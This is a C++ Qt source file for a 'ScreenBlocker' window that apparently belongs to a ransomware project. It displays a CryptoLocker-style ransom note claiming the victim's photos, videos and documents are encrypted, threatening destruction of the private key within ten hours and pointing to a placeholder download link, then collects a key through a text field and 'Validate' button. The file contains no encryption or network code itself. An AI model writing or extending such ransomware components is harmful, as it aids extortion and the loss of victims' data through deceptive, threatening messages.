#include "screenblocker.h"

ScreenBlocker::ScreenBlocker(QWidget *parent) : QWidget(parent)
{
    // Create a layout for the window
    QVBoxLayout* layout = new QVBoxLayout(this);

    // Create a label for the "Hello" text
    QLabel* label = new QLabel("CryptoLocker\n\n"
                               "Your important files encryption produced on this computer: "
                               "photos, videos, documents, etc.\n"
                               "If you see this text, but do not see the \"CryptoLocker\" window, "
                               "then your antivirus deleted \"CryptoLocker\" from computer.\n"
                               "If you need your files, you have to recover \"CryptoLocker\" from the antivirus "
                               "quarantine, or find a copy of \"CryptoLocker\" in the Internet and start it again.\n"
                               "You can download \"CryptoLocker\" from the link given below.\n"
                               "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n"
                               "Approximate destruction time of your private key:\n"
                               "10h00\n"
                               "If the time is finished you are unable to recover files anymore! Simply remove this "
                               "wallpaper from your desktop."
                               , this);
    label->setAlignment(Qt::AlignCenter);
    layout->addWidget(label);

    // Create a horizontal layout for the text field and button
    QHBoxLayout* hLayout = new QHBoxLayout();
    layout->addLayout(hLayout);

    // Create a line edit for the text field
    textField = new QLineEdit(this);

    //textField->setFixedWidth(this->width() * 0.6);
    hLayout->addWidget(textField);

    // Create a button
    QPushButton* button = new QPushButton("Validate", this);
    //button->setFixedWidth(this->width() * 0.05);
    hLayout->addWidget(button);

    // Connect the button's clicked signal to the handleButtonClick function
    connect(button, &QPushButton::clicked, this, &ScreenBlocker::onButtonClicked);
}

void ScreenBlocker::handleButtonClick()
{
    textField->text();
    close(); // close the window
}

void ScreenBlocker::onButtonClicked()
{
    handleButtonClick();
}

QString ScreenBlocker::getKey()
{
    return textField->text();
}

void ScreenBlocker::clearKey() {
    textField->clear();
}
